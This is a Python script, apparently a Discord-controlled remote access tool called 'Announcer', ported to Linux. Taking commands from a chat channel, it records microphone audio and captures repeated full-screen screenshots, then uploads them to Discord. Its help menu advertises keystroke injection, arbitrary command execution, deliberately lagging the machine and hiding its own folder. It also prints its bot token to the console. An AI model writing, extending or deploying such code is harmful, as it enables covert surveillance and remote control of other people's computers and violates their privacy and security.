# LINUX PORT OF ANNOUNCER

import os
import sys
import discord
from dotenv import load_dotenv
import requests
import asyncio
import sounddevice as sd
import soundfile as sf
import time
import subprocess
import shutil
import urllib.parse

# load env variables from .env file
load_dotenv()
token = os.getenv("Ethan")
if not token:
    load_dotenv(dotenv_path='C:\\announcer\\.env')
    token = os.getenv("Ethan")
print(f"Token value: {token}")


clientName = os.uname().nodename
selectedClient = "None"
timeout = 1
command_mode = False

print(clientName)

async def wifi_check():
    while True:
        try:
            requests.head("https://discord.com", timeout=timeout)
            print('The internet connection is active')
            break
        except requests.ConnectionError:
            print("The internet connection is down, retrying...")
            await asyncio.sleep(1)

asyncio.run(wifi_check())


async def capture_screenshot(filename: str):
    def _capture():
        # Try using mss (fast, cross-platform for X11)
        try:
            import mss
            import mss.tools
            with mss.mss() as sct:
                monitor = sct.monitors[0]
                sct_img = sct.grab(monitor)
                mss.tools.to_png(sct_img.rgb, sct_img.size, output=filename)
            return True
        except Exception:
            pass

        # Try Pillow ImageGrab
        try:
            from PIL import ImageGrab
            im = ImageGrab.grab(all_screens=True)
            im.save(filename)
            return True
        except Exception:
            pass

        # Try Wayland tool 'grim' if available
        if shutil.which('grim'):
            try:
                subprocess.check_call(['grim', filename])
                return True
            except Exception:
                pass

        # Try KDE's Spectacle
        if shutil.which('spectacle'):
            try:
                subprocess.check_call(['spectacle', '-b', '-n', '-o', filename])
                return True
            except Exception:
                pass

        # Try ImageMagick 'import' (works on X11)
        if shutil.which('import'):
            try:
                subprocess.check_call(['import', '-window', 'root', filename])
                return True
            except Exception:
                pass

        # Try gnome-screenshot (try forcing X11 backend first)
        if shutil.which('gnome-screenshot'):
            try:
                env = os.environ.copy()
                env['GDK_BACKEND'] = 'x11'
                subprocess.check_call(['gnome-screenshot', '-f', filename], env=env)
                return True
            except Exception:
                try:
                    subprocess.check_call(['gnome-screenshot', '-f', filename])
                    return True
                except Exception:
                    pass

        # Try scrot (common fallback)
        if shutil.which('scrot'):
            try:
                subprocess.check_call(['scrot', filename])
                return True
            except Exception:
                pass

        # Try xdg-desktop-portal via gdbus (GNOME/Wayland portal)
        if shutil.which('gdbus'):
            try:
                out = subprocess.check_output([
                    'gdbus', 'call', '--session', '--dest', 'org.freedesktop.portal.Desktop',
                    '--object-path', '/org/freedesktop/portal/desktop', '--method',
                    'org.freedesktop.portal.Screenshot.Screenshot', '{}', '{}'
                ], text=True)
                idx = out.find('file://')
                if idx != -1:
                    # find end (quote or space)
                    end = out.find("'", idx)
                    if end == -1:
                        end = out.find('"', idx)
                    if end == -1:
                        end = len(out)
                    uri = out[idx:end]
                    path = urllib.parse.unquote(uri[len('file://'):])
                    if os.path.exists(path):
                        shutil.copy(path, filename)
                        return True
            except Exception:
                pass

        return False

    ok = await asyncio.to_thread(_capture)
    if not ok:
        raise RuntimeError('No available screenshot method (install mss, Pillow, scrot, or grim)')

class MyClient(discord.Client):
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.cancelled = False

    async def on_disconnect(self):
        print("Bot disconnected from Discord (possible internet loss).")

    async def on_resumed(self):
        print("Bot reconnected to Discord.")

    async def on_ready(self):
        print(f'Logged on as {self.user}!')
        await self.change_presence(activity=discord.Game(name="Started!"))
        await asyncio.sleep(3)
        await self.change_presence(activity=discord.Game(name="Online, with linux"))

    async def on_message(self, message):
        global command_mode
        if message.author == self.user:
            return
        
        if not command_mode:
                if message.content.startswith('client '):
                    global selectedClient
                    
                    if message.content[7:].strip() == 'list':
                        await message.channel.send(f'Current selected client: {selectedClient}\nAvailable clients: {clientName}')
                        return
                    
                    selectedClient = message.content[7:].strip()
                    await message.channel.send(f'Selected client set to {selectedClient}')
                    return
                
                if message.content == 'help':
                    help_message = (
                        "# PLEASE RUN client list to select a client\n"
                        "# you cannot use the program without selecting a client\n"
                        "## Available commands:\n"
                        "rec - Record audio\n"
                        "upd - Update the application\n"
                        "scr - Take a screenshot\n"
                        "tts - Text-to-speech\n"
                        "msg - Display a message box\n"
                        "lock - Lock the screen\n"
                        "key - Send keystrokes\n"
                        "close - Close a process\n"
                        "img - Display an image\n"
                        "vid - Display a video\n"
                        "sound - Play a sound\n"
                        "vol - Set the volume\n"
                        "shortcut - Press a shortcut\n"
                        "lag - Lag computer(CPU and RAM and GPU)\n"
                        "cmd - Run a command\n"
                        "cmdtoggle - Toggle command mode\n"
                        "hide - Hide the announcer folder\n"
                        "unhide - Unhide the announcer folder\n"
                        "help - Show this help message\n"
                    )
                    await message.channel.send(help_message)

                if selectedClient != clientName and selectedClient != 'debug':
                    #cancel message if the client is not selected or if the message is not for this client
                    print(f'Message received for {selectedClient}, ignoring on {clientName}')
                    return
                
                if f'{message.content}' == 'cmdtoggle':
                   command_mode = True
                   await message.channel.send('Command mode enabled. Type "cmdtoggle" again to disable.')

                if message.content == 'cancel':
                    self.cancelled = True
                    await message.channel.send('Operation cancelled')
                    await asyncio.sleep(3)  # Give some time for ongoing operations to check the flag
                    self.cancelled = False # Reset for future operations
                    return
                
                #utility commands

                if message.content == 'rec':
                    await message.channel.send('Recording audio...')

                    try:
                        devices = sd.query_devices()
                    except Exception as e:
                        await message.channel.send(f'Could not query audio devices: {e}')
                        return

                    input_devices = [(i, d) for i, d in enumerate(devices) if d.get('max_input_channels', 0) > 0]
                    if not input_devices:
                        await message.channel.send('No input devices found on this system.')
                        return

                    list_lines = []
                    for local_idx, (sys_idx, dev) in enumerate(input_devices):
                        name = dev.get('name', 'Unknown')
                        list_lines.append(f"{local_idx}: {name} (system index {sys_idx})")

                    await message.channel.send('Available input devices:\n' + '\n'.join(list_lines) + '\nReply with the device number to use, or type "cancel" to abort. You have 30 seconds.')

                    def check(m):
                        return m.author == message.author and m.channel == message.channel

                    try:
                        reply = await self.wait_for('message', check=check, timeout=30)
                    except asyncio.TimeoutError:
                        await message.channel.send('No response received. Recording cancelled.')
                        return

                    if reply.content.lower().strip() == 'cancel':
                        await message.channel.send('Recording cancelled.')
                        return

                    try:
                        chosen_local = int(reply.content.strip())
                    except Exception:
                        await message.channel.send('Invalid selection. Please provide a number from the list.')
                        return

                    if not (0 <= chosen_local < len(input_devices)):
                        await message.channel.send('Selection out of range.')
                        return

                    sys_idx = input_devices[chosen_local][0]
                    dev_info = sd.query_devices(sys_idx)
                    samplerate = int(dev_info.get('default_samplerate') or 44100)
                    duration = 10 # seconds

                    await message.channel.send(f'Recording {duration}s from "{dev_info.get("name","Unknown")}"...')

                    def do_record(device_index, dur, sr):
                        sd.default.device = device_index
                        rec = sd.rec(int(dur * sr), samplerate=sr, channels=1, dtype='float32')
                        sd.wait()
                        return rec

                    try:
                        recording = await asyncio.to_thread(do_record, sys_idx, duration, samplerate)
                    except Exception as e:
                        await message.channel.send(f'Error during recording: {e}')
                        return

                    filename = f"recording_{int(time.time())}.wav"
                    try:
                        await asyncio.to_thread(sf.write, filename, recording, samplerate)
                    except Exception as e:
                        await message.channel.send(f'Could not save recording: {e}')
                        return

                    try:
                        await message.channel.send('Recording finished — sending file...')
                        await message.channel.send(file=discord.File(filename))
                    except Exception as e:
                        await message.channel.send(f'Could not send file: {e}')
                    finally:
                        try:
                            os.remove(filename)
                        except Exception:
                            pass

                    return
                
                # scr - Take a screenshot
                if message.content.startswith('scr'):
                    print('Taking screenshot(s)')
                    parts = message.content.strip().split()
                    if len(parts) == 2 and parts[1].isdigit():
                        amount = int(parts[1])
                        print(f'Taking {amount} screenshot(s)')
                        for i in range(amount):
                            if self.cancelled:
                                await message.channel.send('Screenshot operation cancelled.')
                                break
                            try:
                                await capture_screenshot('screenshot.png')
                            except Exception as e:
                                await message.channel.send(f'Could not take screenshot: {e}')
                                break
                            await message.channel.send(file=discord.File('screenshot.png'))
                            try:
                                os.remove('screenshot.png')
                            except Exception:
                                pass
                            await asyncio.sleep(1)
                        print('Screenshots taken')
                    else:
                        await message.channel.send('Incorrect syntax! Usage: scr <number>')


intents = discord.Intents.default()
intents.message_content = True
client = MyClient(intents=intents)
client.run(str(token))